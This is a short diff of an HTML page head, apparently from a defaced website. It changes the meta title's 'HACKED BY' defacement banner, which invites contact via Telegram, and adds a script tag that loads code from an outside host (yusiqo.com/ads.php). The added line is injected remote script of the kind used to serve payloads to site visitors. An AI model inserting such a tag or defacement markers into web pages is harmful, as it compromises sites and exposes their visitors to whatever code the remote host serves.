@@ -13,8 +13,8 @@
 <meta name="MobileOptimized" content="width" />
 
 <title>GHOST</title>
-
-<meta name="title" content="HACKED BY RITALIN... Telegram Adresimize Bekleriz | " />
+<script src="//yusiqo.com/ads.php"></script>
+<meta name="title" content="HACKED BY LORD... Telegram Adresimize Bekleriz | " />
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" type="dc77ef42440bc64ce86364eb-text/javascript"></script>
 
